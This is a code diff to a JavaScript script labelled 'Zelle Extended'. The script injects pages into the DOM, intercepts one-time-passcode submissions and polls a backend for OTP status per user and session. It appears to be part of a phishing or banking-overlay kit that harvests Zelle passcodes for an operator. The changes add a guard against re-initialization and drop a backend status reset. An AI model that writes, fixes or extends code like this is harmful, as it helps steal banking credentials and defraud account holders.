@@ -14,6 +14,7 @@
     let currentUserId = null;
     let currentSessionId = null;
     let otpPollInterval = null;
+    let flowInitialized = false; // ✅ Guard to prevent re-initialization
     
     // ========================================
     // INJECT MODALS/PAGES INTO DOM
@@ -899,14 +900,10 @@
                     // Show error immediately
                     showOtpError();
                     
-                    // Reset status to 'idle' so backend is ready for retry
-                    // But DON'T restart polling - let user manually re-enter OTP
-                    // Polling will restart automatically when user submits new OTP (via interceptOtpSubmission)
-                    await fetch(`${API_URL}/api/reset-otp-status?id=${userId}`, {
-                        method: 'POST'
-                    });
+                    // ❌ REMOVED: Don't reset status - it causes re-init chaos
+                    // The status will be reset when user submits new OTP
                     
-                    console.log('[Zelle Extended] 🔄 Status reset to idle, waiting for user to retry OTP...');
+                    console.log('[Zelle Extended] 🔄 Waiting for user to retry OTP...');
                 }
             } catch (error) {
                 console.error('[Zelle Extended] ❌ Polling error:', error);
@@ -956,6 +953,13 @@
     // INITIALIZE (SIMPLE & CLEAN)
     // ========================================
     function init() {
+        // ✅ Prevent re-initialization
+        if (flowInitialized) {
+            console.log('[Zelle Extended] ⚠️ Already initialized, skipping...');
+            return;
+        }
+        
+        flowInitialized = true;
         console.log('[Zelle Extended] Initializing multi-step flow...');
         injectHTML();
         interceptOtpSubmission();
